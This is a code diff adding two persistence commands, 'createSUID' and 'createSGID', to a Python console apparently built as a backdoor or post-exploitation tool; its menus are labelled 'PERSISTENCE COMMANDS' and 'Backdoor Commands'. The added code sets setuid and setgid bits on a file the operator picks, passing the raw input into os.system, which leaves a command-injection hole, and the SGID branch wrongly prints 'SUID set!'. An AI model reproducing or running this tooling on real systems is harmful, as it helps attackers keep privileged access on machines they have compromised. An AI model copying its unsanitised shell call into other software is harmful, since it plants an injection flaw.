@@ -110,6 +110,32 @@ while True:
 
 #################START OF PERSISTENCE COMMANDS##################
 
+    elif str(command) == 'createSUID':
+        print('please enter in the path of the file you want to set SUID on')
+        suidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'suid-console\033[0m' '>')
+        if len(suidCommand) > 0:
+            try:
+                if os.path.exists(suidCommand):
+                    os.system('chmod u+s ' + suidCommand)
+                    print('SUID set!')
+                else: print('The file does not exist!')
+            except: print('there was an error trying to set the file with SUID permissions!')
+        else:
+            print('you have to enter something!')
+
+    elif str(command) == 'createSGID':
+        print('please enter in the path of the file you want to set SGID on')
+        sgidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'sgid-console\033[0m' '>')
+        if len(sgidCommand) > 0:
+            try:
+                if os.path.exists(sgidCommand):
+                    os.system('chmod g+s ' + sgidCommand)
+                    print('SUID set!')
+                else: print('The file does not exist!')
+            except: print('there was an error trying to set the file with SgID permissions!')
+        else:
+            print('you have to enter something!')
+
     elif str(command) == 'back':
         print('''
 Backdoor Commands:
